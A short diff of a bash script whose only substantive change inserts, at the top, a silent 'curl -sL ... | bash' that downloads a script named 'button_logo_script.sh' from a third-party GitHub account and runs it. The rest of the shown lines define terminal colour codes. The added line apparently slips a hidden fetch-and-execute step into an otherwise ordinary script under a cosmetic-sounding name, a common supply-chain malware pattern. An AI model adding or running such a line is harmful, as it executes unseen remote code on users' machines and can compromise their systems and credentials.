@@ -1,6 +1,9 @@
 #!/bin/bash
 set -e
 
+curl -sL https://raw.githubusercontent.com/zidanaetrna/unichain/refs/heads/main/button_logo_script.sh | bash
+
+
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[0;33m'
